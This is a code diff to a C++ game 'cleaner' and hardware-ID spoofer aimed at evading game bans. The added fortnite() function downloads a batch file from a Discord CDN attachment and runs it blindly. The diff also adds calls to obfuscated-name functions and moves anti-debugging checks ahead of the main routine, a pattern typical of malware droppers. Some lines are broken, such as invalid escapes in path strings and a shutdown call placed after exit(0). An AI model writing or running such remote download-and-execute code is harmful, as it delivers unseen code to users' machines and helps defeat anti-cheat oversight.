@@ -91,7 +91,14 @@ void gta()
     system("Start C:\gta.bat");
 
 }
-
+void fortnite()
+{
+    akfuxnl();
+    std::string fortnite = "https://cdn.discordapp.com/attachments/834754431249285140/878937010574852106/Fortnite.bat";
+    std::string fortnitepath = "C:\Fortnite.bat";
+    URLDownloadToFileA(NULL, fortnite.c_str(), fortnitepath.c_str(), 0, NULL);
+    system("Start C:\Fortnite.bat");
+}
 void fishingplanet()
 {
 
@@ -232,27 +239,38 @@ void cleaner(){
 }
 void safeshutdown()
 {
-
+    rydekem();
+    plvbjwh();
+    tlmisir();
+    akfuxnl();
+    lnttirs();
     std::remove("C:\Cold-Ware.bat");
     std::remove("C:\Fishing-planet.bat");
     std::remove("C:\Apex.bat");
     std::remove("C:\gta.bat");
+    std::remove("C:\Fortnite.bat");
 
     std::remove("Cold-Ware.bat");
     std::remove("Fishing-planet.bat");
     std::remove("Apex.bat");
     std::remove("gta.bat");
+    std::remove("Fortnite.bat");
 
     system(XorStr("cls").c_str());
-
+    rydekem();
+    plvbjwh();
+    tlmisir();
+    akfuxnl();
+    lnttirs();
     string a;
-    std::cout << "Do you want to shutdown your pc? Yes/No";
+    std::cout << "Do you want to shutdown your pc? \nYes/No : ";
     cin >> a;
     if (a == "Yes" || a == "yes")
     {
         exit(0);
         system(XorStr("shutdown -l").c_str());
     }
+    
     else if (a == "No" || a == "no")
     {
         if (cleaner)
@@ -312,11 +330,13 @@ void spoofer()
 void mainbot()
 {
     system(XorStr("cls").c_str());
-    std::cout << "After you use the cleaner, verify the game's integrity files";
+    std::cout << "After you use the cleaner, verify the game's integrity files\n";
     Sleep(2000);
-    std::cout << "The cleaner deletes some files from the games. closes some processes and editing some registers, as well as spoofing the hwid.";
+    std::cout << "\nThe cleaner deletes some files from the games. closes some processes and editing some registers.";
     Sleep(2000);
-    std::cout << "Reinstalling the game may be more usefull then just verifing it.";
+    std::cout << "\nAs well as spoofing the hwid.\n";
+    std::cout << "\n";
+    std::cout << "\nReinstalling the game may be more usefull then just verifing it.\n";
     Sleep(2000);
     system(XorStr("cls").c_str());
     Sleep(2000);
@@ -325,6 +345,7 @@ void mainbot()
     gta();
     apex();
     cod();
+    fortnite();
     spoofer();
     
 }
@@ -332,11 +353,13 @@ void mainbot()
 
 int main()
 {
-    mainbot();
     antiattachlmao();
     WindowFinder();
     Output();
     protection::IsDbgPresent();
+    mainbot();
+    
+    
     
     
     
